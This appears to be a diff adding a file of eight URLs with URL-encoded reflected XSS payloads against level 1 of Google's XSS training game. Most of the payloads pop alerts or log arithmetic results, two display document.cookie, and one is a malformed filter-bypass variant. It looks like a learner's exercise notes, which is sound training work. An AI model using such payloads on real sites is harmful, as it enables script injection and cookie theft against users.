@@ -1,0 +1,16 @@
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert%286000%2F3000%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Econsole.log%285000%2F3000%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Eprompt%28document.cookie%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3Cscript%3Eprompt%285000%2F200%29%3C%2Fscript%3E
+
+https://xss-game.appspot.com/level1/frame?query=%3C%5Cscript%5C%3E+alert%286000%2F3000%29%3C%2F%2Fscript%3E
+
